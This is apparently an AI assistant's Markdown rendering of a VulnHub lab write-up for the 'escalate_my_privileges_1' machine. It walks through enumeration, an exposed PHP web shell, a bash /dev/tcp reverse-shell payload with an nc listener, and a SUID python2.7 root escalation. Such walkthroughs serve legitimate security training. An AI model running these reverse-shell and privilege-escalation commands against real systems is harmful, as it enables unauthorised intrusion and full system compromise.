Here is your **professional and polished writeup** in **Markdown format**, perfect for publishing on GitHub, a personal portfolio, or a cybersecurity blog:

---

````markdown
# 🧠 VulnHub Writeup: escalate_my_privileges_1

- **Machine Name:** escalate_my_privileges_1  
- **IP Address:** `10.38.1.120`  
- **Difficulty:** Beginner – Intermediate  
- **Hash (MD5):** `d44f39d1ef8c5e3d9ef5f82a7afafe5b`  
- **Goal:** Gain root access and capture `proof.txt`

---

## 🔍 1. Enumeration

### 🔎 Nmap Scan
```bash
sudo nmap -sC -sV -oN nmap.txt 10.38.1.120
````

> *(Standard service and version detection scan. Based on results, a web server was assumed.)*

---

### 📁 Web Enumeration

#### `dirb` Scan

```bash
dirb http://10.38.1.120 /usr/share/dirb/wordlists/common.txt
```

**Discovered Paths:**

* `/cgi-bin/` — `403 Forbidden`
* `/index.html` — `200 OK`
* `/phpinfo.php` — `200 OK`
* `/robots.txt` — `200 OK`

#### `/robots.txt` Content:

```txt
User-agent: *
Disallow: /phpbash.php
```

🕵️ Interesting Discovery: `/phpbash.php`
This appears to be a **PHP web shell** and provides a great entry point.

---

## 🎯 2. Initial Access

### ✅ Web Shell Access

Navigating to:

```
http://10.38.1.120/phpbash.php
```

Provides a working web shell under the user `apache`.

---

### 🖥️ Reverse Shell

Generated a reverse shell using `msfvenom`:

```bash
msfvenom -p cmd/unix/reverse_bash LHOST=10.38.1.121 LPORT=5555 -f raw
```

**Payload Used:**

```bash
bash -c '0<&125-;exec 125<>/dev/tcp/10.38.1.121/5555;sh <&125 >&125 2>&125'
```

**Listener Setup:**

```bash
nc -lvp 5555
```

**Successful Shell:**

```
Connection from: 10.38.1.120
User: apache (uid=48)
```

---

## 📂 3. Post-Exploitation

Listing files in the current directory:

```bash
ls
```

**Found:**

* `Credentials.txt`
* `backup.sh`
* `runme.sh`
* `test.txt`

---

## 🔐 4. Privilege Escalation

### 🔍 SUID Binary Enumeration

```bash
find / -perm -4000 -type f -ls 2>/dev/null
```

**Interesting Find:**

```bash
/usr/bin/python2.7
```

This binary has the SUID bit set and can be abused for privilege escalation.

---

### ⚡ Privilege Escalation Using Python SUID

```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Privilege Escalation Successful:**

```bash
id
uid=0(root) gid=48(apache) groups=48(apache)
```

---

## 🏁 5. Capture the Flag

```bash
cd /root
cat proof.txt
```

**Flag:**

```
Best of Luck
628435356e49f976bab2c04948d22fe4
```

---

## ✅ Summary

| Step                    | Action                                          |
| ----------------------- | ----------------------------------------------- |
| 🔍 Enumeration          | Discovered `/phpbash.php` via `robots.txt`      |
| 🧠 Initial Access       | Gained shell access as `apache` using web shell |
| 🚀 Privilege Escalation | Abused SUID `python2.7` to get root access      |
| 🏁 Flag Captured        | `628435356e49f976bab2c04948d22fe4`              |

---

> 🛡️ **Security Takeaway:**
> This machine highlights how dangerous it is to leave debugging tools like `phpbash.php` exposed on production environments. Additionally, misconfigured SUID binaries (especially interpreters like Python) can be easily exploited for full system compromise.

---

```

Let me know if you'd like a:
- **PDF version**
- **HTML blog template**
- **Jekyll/Markdown blog post**
- **Cybersecurity portfolio format**

I'll generate and format it for you instantly.
```
